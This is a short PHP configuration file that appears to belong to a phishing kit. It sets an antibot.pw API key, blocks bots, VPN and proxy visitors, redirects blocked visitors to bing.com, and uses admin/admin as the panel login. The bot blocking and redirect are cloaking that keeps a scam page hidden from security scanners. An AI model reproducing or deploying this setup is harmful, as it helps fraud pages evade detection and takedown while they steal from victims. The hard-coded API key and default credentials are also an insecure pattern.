<?php
/**
 * @Author: Nokia 1337
 * @Date:   2019-09-30 10:55:56
 * @Last Modified by:   Nokia 1337
 * @Last Modified time: 2019-10-10 22:07:53
*/
$config['apikey'] 			= '0805968671a2df9fff2b8dea1e45d979';  	// https://antibot.pw/dashboard/developers

//--- [ PAGE CONFIG ] ---//

$config['bot_block']    	= true; 						// if this domain is visited by bot / vpn / proxy it will be blocked. (Config Setting : https://antibot.pw/dashboard/antibot-blocker)
$config['redirect_bot'] 	= 'https://bing.com';
$config['username_panel'] 	= 'admin';
$config['password_panel'] 	= 'admin';